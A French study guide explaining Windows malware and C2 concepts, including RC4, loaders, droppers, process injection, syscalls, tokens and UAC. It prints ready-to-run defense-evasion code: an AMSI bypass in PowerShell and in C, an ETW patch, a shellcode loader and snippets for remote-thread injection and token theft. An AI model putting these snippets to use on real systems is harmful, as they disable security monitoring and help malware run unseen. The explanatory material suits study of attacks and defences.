# Réponses - Concepts OS & C2

## Cryptographie

### C'est quoi RC4 ?

**RC4** (Rivest Cipher 4) est un algorithme de chiffrement par flux (stream cipher) créé par Ron Rivest en 1987.

#### Fonctionnement simplifié

```
┌─────────────────────────────────────────────────────────────┐
│                         RC4                                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Clé (ex: "password")                                      │
│         │                                                    │
│         ▼                                                    │
│   ┌─────────────┐                                           │
│   │    KSA      │  Key Scheduling Algorithm                 │
│   │  (init S)   │  → Mélange un tableau de 256 octets       │
│   └─────────────┘                                           │
│         │                                                    │
│         ▼                                                    │
│   ┌─────────────┐                                           │
│   │    PRGA     │  Pseudo-Random Generation Algorithm       │
│   │ (keystream) │  → Génère un flux pseudo-aléatoire        │
│   └─────────────┘                                           │
│         │                                                    │
│         ▼                                                    │
│   Texte clair  XOR  Keystream  =  Texte chiffré             │
│   "Hello"      XOR  [A3 F2..]  =  [chiffré]                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### Code simplifié (pseudo-code)

```c
// Phase 1: Key Scheduling (KSA)
S[256] = {0, 1, 2, ..., 255}  // tableau de 0 à 255
j = 0
for i = 0 to 255:
    j = (j + S[i] + key[i % key_len]) % 256
    swap(S[i], S[j])

// Phase 2: Génération du keystream (PRGA)
i = j = 0
for each byte in plaintext:
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    swap(S[i], S[j])
    K = S[(S[i] + S[j]) % 256]  // octet du keystream
    ciphertext += plaintext[byte] XOR K
```

#### Pourquoi RC4 est populaire dans les malwares ?

| Avantage | Explication |
|----------|-------------|
| **Simple à implémenter** | ~50 lignes de code, pas de dépendances |
| **Rapide** | Que des opérations simples (swap, XOR, modulo) |
| **Petit footprint** | Pas besoin de libs crypto lourdes |
| **Pas de padding** | Chiffre octet par octet |
| **Bi-directionnel** | Le même code chiffre et déchiffre |

#### ⚠️ Pourquoi c'est "obsolète" en sécurité

- **Biais statistiques** dans les premiers octets du keystream
- **Vulnérable** si on réutilise la même clé
- **Cassé** pour WEP/WPA (attaques connues)

#### Utilisation typique dans un C2

```c
// Chiffrer les communications agent ↔ serveur
char* encrypt_beacon(char* data, char* key) {
    rc4_init(key);
    return rc4_crypt(data);  // XOR avec keystream
}

// Même fonction pour déchiffrer (XOR est réversible)
char* decrypt_beacon(char* data, char* key) {
    rc4_init(key);
    return rc4_crypt(data);
}
```

#### Alternatives modernes

| Algo | Type | Notes |
|------|------|-------|
| **ChaCha20** | Stream cipher | Plus sécurisé, aussi rapide |
| **AES-GCM** | Block cipher | Standard, authentifié |
| **XOR simple** | Obfuscation | Encore plus simple, moins sécurisé |

---

## Composants Malware

### C'est quoi un Loader ?

Un **loader** est un programme dont le seul but est de **charger et exécuter** du code (shellcode, DLL, exe) en mémoire.

```
┌─────────────────────────────────────────────────────────────┐
│                        LOADER                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   1. Récupère le payload (embarqué, téléchargé, déchiffré)  │
│                          │                                   │
│                          ▼                                   │
│   2. Alloue de la mémoire exécutable (VirtualAlloc RWX)     │
│                          │                                   │
│                          ▼                                   │
│   3. Copie le payload en mémoire                            │
│                          │                                   │
│                          ▼                                   │
│   4. Exécute (CreateThread, callback, jump)                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Code typique d'un loader :**
```c
// 1. Payload chiffré (évite détection statique)
unsigned char shellcode[] = { 0x4d, 0x5a, ... };

// 2. Déchiffre
xor_decrypt(shellcode, key);

// 3. Alloue mémoire exécutable
void* mem = VirtualAlloc(NULL, sizeof(shellcode), 
                         MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// 4. Copie
memcpy(mem, shellcode, sizeof(shellcode));

// 5. Exécute
((void(*)())mem)();
```

---

### C'est quoi un Dropper ?

Un **dropper** est un programme qui **dépose (drop)** un fichier malveillant sur le disque puis l'exécute.

```
┌─────────────────────────────────────────────────────────────┐
│                       DROPPER                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Dropper.exe                                               │
│       │                                                      │
│       ├──► Extrait payload.exe (depuis ressources)          │
│       │                                                      │
│       ├──► Écrit sur disque: C:\Temp\payload.exe            │
│       │                                                      │
│       └──► Exécute: CreateProcess("payload.exe")            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

| Loader | Dropper |
|--------|---------|
| Exécute **en mémoire** | Écrit **sur disque** |
| Plus discret | Laisse des traces |
| "Fileless" | Fichier analysable |

---

### C'est quoi Stager vs Stageless ?

```
┌─────────────────────────────────────────────────────────────┐
│                    STAGER (multi-étapes)                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Stage 0 (petit, ~500 bytes)                               │
│       │                                                      │
│       ├──► Contacte le C2                                   │
│       │                                                      │
│       ├──► Télécharge Stage 1 (gros payload)                │
│       │                                                      │
│       └──► Exécute Stage 1 en mémoire                       │
│                                                              │
│   Avantages:                                                │
│   - Payload initial très petit (passe mieux)                │
│   - Payload final jamais sur disque                         │
│   - Peut mettre à jour le stage 1                           │
│                                                              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                   STAGELESS (tout-en-un)                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Payload complet (~300 KB)                                 │
│       │                                                      │
│       └──► Exécute directement, pas de téléchargement       │
│                                                              │
│   Avantages:                                                │
│   - Pas de connexion réseau initiale                        │
│   - Fonctionne même si C2 down au départ                    │
│   - Plus simple                                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

### C'est quoi un Packer/Crypter ?

Un **packer** compresse et/ou chiffre un exe pour :
1. Réduire sa taille
2. Obfusquer son contenu
3. Éviter la détection par signature

```
┌─────────────────────────────────────────────────────────────┐
│                    PACKER / CRYPTER                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   malware.exe (détecté par AV)                              │
│       │                                                      │
│       ▼                                                      │
│   ┌─────────────────────────────────────────┐               │
│   │           PACKER                         │               │
│   │   1. Compresse le code original         │               │
│   │   2. Chiffre avec une clé               │               │
│   │   3. Ajoute un stub de décompression    │               │
│   └─────────────────────────────────────────┘               │
│       │                                                      │
│       ▼                                                      │
│   packed.exe (pas détecté... pour l'instant)                │
│                                                              │
│   À l'exécution:                                            │
│   packed.exe ──► déchiffre ──► décompresse ──► exécute      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Comment fonctionne la détection AV ?

### Les 3 types de détection

```
┌─────────────────────────────────────────────────────────────┐
│              MÉTHODES DE DÉTECTION ANTIVIRUS                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. STATIQUE (avant exécution)                              │
│     ├── Signatures: hash du fichier, patterns d'octets     │
│     ├── Heuristique: analyse du code (imports suspects)    │
│     └── Entropy: fichiers très compressés = suspect        │
│                                                              │
│  2. DYNAMIQUE (pendant exécution)                           │
│     ├── Sandbox: exécute dans une VM isolée                │
│     ├── Comportement: surveille les actions suspectes      │
│     └── API hooking: intercepte les appels système         │
│                                                              │
│  3. CLOUD/ML                                                │
│     ├── Envoie les fichiers suspects au cloud              │
│     └── Machine learning sur les comportements             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Comment bypass chaque type ?

| Type | Technique de bypass |
|------|---------------------|
| **Signatures** | Chiffrement, polymorphisme, recompilation |
| **Heuristique** | Indirect syscalls, API obfuscation |
| **Sandbox** | Détection VM, sleep long, interaction user |
| **Comportemental** | Injection dans process légitime |
| **Hooking** | Syscalls directs, unhooking ntdll |

### EDR vs AV

| AV Traditionnel | EDR (Endpoint Detection & Response) |
|-----------------|-------------------------------------|
| Focus sur les fichiers | Focus sur les comportements |
| Signatures | Machine learning + télémétrie |
| Bloque à l'exécution | Détecte + répond + forensics |
| Facile à bypass | Plus difficile à bypass |

---

## Syscalls & APIs

### C'est quoi un Syscall vs une API Windows ?

```
┌─────────────────────────────────────────────────────────────┐
│                 ARCHITECTURE WINDOWS                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Application (ton code)                                    │
│         │                                                    │
│         ▼                                                    │
│   kernel32.dll / user32.dll  ← APIs Windows haut niveau     │
│         │                                                    │
│         ▼                                                    │
│   ntdll.dll                  ← API native (Nt/Zw functions) │
│         │                                                    │
│         ▼                                                    │
│   SYSCALL instruction        ← Transition vers kernel mode  │
│         │                                                    │
│  ════════════════════════════════════════════════════════   │
│         │                     Barrière User/Kernel          │
│         ▼                                                    │
│   ntoskrnl.exe (Kernel)      ← Code privilégié              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

| API Windows | Syscall |
|-------------|---------|
| `CreateFile()` (kernel32) | `NtCreateFile()` → `syscall` |
| Haut niveau, documenté | Bas niveau, non documenté |
| Peut être hooké par AV | Difficile à hooker |

### Pourquoi ntdll.dll est important ?

**ntdll.dll** est la dernière couche avant le kernel. C'est là que les AV/EDR placent leurs hooks.

```c
// Appel normal (hooké par AV)
CreateFile() → kernel32 → ntdll [HOOK AV] → syscall

// Syscall direct (bypass hook)
NtCreateFile() → syscall direct (pas de passage par ntdll hooké)
```

### Comment bypass les hooks (syscalls indirects) ?

```c
// 1. Lire le syscall number depuis ntdll "propre" (sur disque)
BYTE ntdll_on_disk[] = ReadFile("C:\\Windows\\System32\\ntdll.dll");
DWORD syscall_num = GetSyscallNumber(ntdll_on_disk, "NtCreateFile");

// 2. Préparer les arguments dans les registres
mov r10, rcx
mov eax, syscall_num  // ex: 0x55 pour NtCreateFile

// 3. Exécuter syscall directement
syscall
```

**Techniques courantes :**
| Technique | Description |
|-----------|-------------|
| **Direct syscall** | Appel syscall sans passer par ntdll |
| **Indirect syscall** | Jump vers instruction syscall dans ntdll |
| **Hell's Gate** | Lecture dynamique des syscall numbers |
| **Halo's Gate** | Variation de Hell's Gate |
| **SysWhispers** | Génération de stubs syscall |

---

## Injection & Exécution

### Process Injection - Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────┐
│              TECHNIQUES D'INJECTION                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐         ┌─────────────┐                    │
│  │ Process A   │  ────►  │ Process B   │                    │
│  │ (Attaquant) │         │ (Victime)   │                    │
│  └─────────────┘         └─────────────┘                    │
│                                                              │
│  Méthodes:                                                   │
│  1. CreateRemoteThread     - Classique, détecté             │
│  2. NtQueueApcThread       - Via APC, plus discret          │
│  3. SetWindowsHookEx       - Via hooks GUI                  │
│  4. Process Hollowing      - Remplace le process            │
│  5. DLL Injection          - Charge une DLL malveillante    │
│  6. Reflective Injection   - DLL en mémoire uniquement      │
│  7. Thread Hijacking       - Détourne un thread existant    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### CreateRemoteThread Injection

```c
// 1. Ouvrir le process cible
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// 2. Allouer mémoire dans le process cible
LPVOID remoteMem = VirtualAllocEx(hProc, NULL, shellcodeSize, 
                                   MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// 3. Écrire le shellcode
WriteProcessMemory(hProc, remoteMem, shellcode, shellcodeSize, NULL);

// 4. Créer un thread distant
CreateRemoteThread(hProc, NULL, 0, remoteMem, NULL, 0, NULL);
```

### Process Hollowing

```
┌─────────────────────────────────────────────────────────────┐
│                  PROCESS HOLLOWING                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Créer svchost.exe SUSPENDU                              │
│     CreateProcess(..., CREATE_SUSPENDED, ...)               │
│                          │                                   │
│                          ▼                                   │
│  2. "Vider" l'image de svchost.exe                          │
│     NtUnmapViewOfSection(...)                               │
│                          │                                   │
│                          ▼                                   │
│  3. Allouer mémoire et écrire notre payload                 │
│     VirtualAllocEx + WriteProcessMemory                     │
│                          │                                   │
│                          ▼                                   │
│  4. Modifier le contexte thread (pointer vers notre code)   │
│     GetThreadContext + SetThreadContext                     │
│                          │                                   │
│                          ▼                                   │
│  5. Reprendre l'exécution                                   │
│     ResumeThread → Notre code s'exécute comme svchost.exe   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Reflective DLL Injection

Charge une DLL **directement en mémoire** sans passer par LoadLibrary (pas de trace dans PEB).

```c
// Le concept:
// 1. La DLL contient son propre loader embarqué
// 2. Le loader parse les headers PE
// 3. Il résout les imports manuellement
// 4. Il fixe les relocations
// 5. Il appelle DllMain

// Avantages:
// - Pas d'écriture sur disque
// - Pas visible dans la liste des modules (PEB)
// - Difficile à détecter
```

---

## ETW & Télémétrie

### C'est quoi ETW (Event Tracing for Windows) ?

```
┌─────────────────────────────────────────────────────────────┐
│                    ETW - Event Tracing                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Providers (sources)          Consumers (qui écoute)       │
│   ┌─────────────────┐          ┌─────────────────┐          │
│   │ Microsoft-       │          │ EDR / SIEM      │          │
│   │ Windows-Kernel   │ ──────►  │ Event Viewer    │          │
│   │ -Process         │          │ Custom tools    │          │
│   └─────────────────┘          └─────────────────┘          │
│                                                              │
│   Événements tracés:                                        │
│   - Création de process                                     │
│   - Chargement de DLL                                       │
│   - Connexions réseau                                       │
│   - Accès fichiers                                          │
│   - Allocations mémoire                                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Comment les EDR utilisent ETW ?

```
Application malveillante
        │
        ▼
    Appel API (ex: CreateRemoteThread)
        │
        ├───────────────► ETW Provider génère un événement
        │                        │
        ▼                        ▼
    Exécution              EDR Consumer
                           ┌─────────────────────┐
                           │ Analyse l'événement │
                           │ - Process source    │
                           │ - Process cible     │
                           │ - Type d'opération  │
                           └─────────────────────┘
                                    │
                                    ▼
                           ALERTE ou BLOCK
```

### Comment patcher ETW ?

```c
// ETW passe par ntdll!EtwEventWrite
// On peut le patcher pour qu'il ne fasse rien

void PatchETW() {
    // 1. Trouver EtwEventWrite dans ntdll
    LPVOID pEtwEventWrite = GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    
    // 2. Changer la protection mémoire
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 3. Écrire "ret" (0xC3) au début = la fonction retourne immédiatement
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    // 4. Restaurer la protection
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}
```

---

## AMSI (Antimalware Scan Interface)

### C'est quoi AMSI ?

```
┌─────────────────────────────────────────────────────────────┐
│                         AMSI                                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   PowerShell / Script Host / Office                         │
│         │                                                    │
│         ▼                                                    │
│   "Invoke-Mimikatz ..."                                     │
│         │                                                    │
│         ▼                                                    │
│   ┌─────────────────────────────────────────┐               │
│   │              AMSI.DLL                    │               │
│   │   AmsiScanBuffer() / AmsiScanString()   │               │
│   └─────────────────────────────────────────┘               │
│         │                                                    │
│         ▼                                                    │
│   Windows Defender / AV                                     │
│         │                                                    │
│         ▼                                                    │
│   AMSI_RESULT_DETECTED → Script BLOQUÉ                      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Comment bypass AMSI ?

```powershell
# Technique 1: Patch amsi.dll en mémoire
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
    public static void Patch() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        Marshal.Copy(new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}, 0, addr, 6);
    }
}
"@
Add-Type $patch
[Bypass]::Patch()
```

```c
// En C: même principe
void BypassAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    LPVOID addr = GetProcAddress(amsi, "AmsiScanBuffer");
    
    // Patch: mov eax, 0x80070057; ret (AMSI_RESULT_CLEAN)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(addr, patch, sizeof(patch));
    VirtualProtect(addr, sizeof(patch), oldProtect, &oldProtect);
}
```

---

## Mémoire Virtuelle

### Heap vs Stack

```
┌─────────────────────────────────────────────────────────────┐
│                    MÉMOIRE D'UN PROCESS                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Adresses hautes                                           │
│   ┌─────────────────────┐                                   │
│   │       STACK         │  ← Variables locales, arguments   │
│   │         ↓           │    Grandit vers le bas            │
│   │    (croît vers bas) │    Allocation automatique (push)  │
│   ├─────────────────────┤                                   │
│   │                     │                                   │
│   │    (espace libre)   │                                   │
│   │                     │                                   │
│   ├─────────────────────┤                                   │
│   │         ↑           │                                   │
│   │       HEAP          │  ← malloc, new, VirtualAlloc      │
│   │   (croît vers haut) │    Allocation manuelle            │
│   ├─────────────────────┤    Doit être free() manuellement  │
│   │   DATA (globales)   │                                   │
│   ├─────────────────────┤                                   │
│   │   CODE (.text)      │                                   │
│   └─────────────────────┘                                   │
│   Adresses basses                                           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

| Stack | Heap |
|-------|------|
| Rapide (LIFO) | Plus lent |
| Taille fixe (~1MB) | Taille dynamique |
| Automatique | Manuel (malloc/free) |
| Variables locales | Données dynamiques |

### Protection Mémoire (RWX)

```c
// Permissions mémoire
PAGE_READONLY          (R--)  // Lecture seule
PAGE_READWRITE         (RW-)  // Lecture/écriture
PAGE_EXECUTE           (--X)  // Exécution seule
PAGE_EXECUTE_READ      (R-X)  // Lecture + exécution
PAGE_EXECUTE_READWRITE (RWX)  // Tout (suspect!)

// Allocation mémoire exécutable (classique shellcode)
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Plus discret: allouer RW, copier, puis changer en RX
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(mem, shellcode, size);
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);  // RW → RX
```

---

## Tokens & Privilèges Windows

### C'est quoi un Token ?

```
┌─────────────────────────────────────────────────────────────┐
│                    ACCESS TOKEN                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Chaque process a un token qui définit:                    │
│                                                              │
│   ┌─────────────────────────────────────────┐               │
│   │ User SID: S-1-5-21-...-1001 (ton user)  │               │
│   ├─────────────────────────────────────────┤               │
│   │ Groups: Administrators, Users, ...      │               │
│   ├─────────────────────────────────────────┤               │
│   │ Privileges:                             │               │
│   │   - SeDebugPrivilege (debug processes)  │               │
│   │   - SeBackupPrivilege (bypass ACL)      │               │
│   │   - SeImpersonatePrivilege              │               │
│   ├─────────────────────────────────────────┤               │
│   │ Integrity Level: Low/Medium/High/System │               │
│   └─────────────────────────────────────────┘               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Token Impersonation

```c
// Voler le token d'un autre process
HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
HANDLE hToken;
OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);

// Dupliquer le token
HANDLE hDupToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, 
                 SecurityImpersonation, TokenPrimary, &hDupToken);

// Créer un process avec ce token
CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe", NULL, ...);
```

---

## UAC (User Account Control)

### Comment fonctionne UAC ?

```
┌─────────────────────────────────────────────────────────────┐
│                         UAC                                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Admin exécute un programme:                               │
│                                                              │
│   ┌─────────────────┐                                       │
│   │   explorer.exe  │  Token: Medium Integrity              │
│   │   (Medium IL)   │  (droits limités)                     │
│   └────────┬────────┘                                       │
│            │                                                 │
│            ▼ Demande élévation                              │
│   ┌─────────────────┐                                       │
│   │   CONSENT.EXE   │  ← Prompt UAC                         │
│   │   (secure UI)   │                                       │
│   └────────┬────────┘                                       │
│            │ User clique "Oui"                              │
│            ▼                                                 │
│   ┌─────────────────┐                                       │
│   │   Programme     │  Token: High Integrity                │
│   │   (élevé)       │  (droits admin)                       │
│   └─────────────────┘                                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### UAC Bypass classiques

| Technique | Description |
|-----------|-------------|
| **fodhelper.exe** | Auto-elevate, registry hijack |
| **eventvwr.exe** | Même principe |
| **DLL hijacking** | Programmes auto-élevés qui chargent DLLs |
| **COM hijacking** | Détournement de COM objects |

---

*Guide mis à jour avec les concepts essentiels pour comprendre le développement C2/agent.*

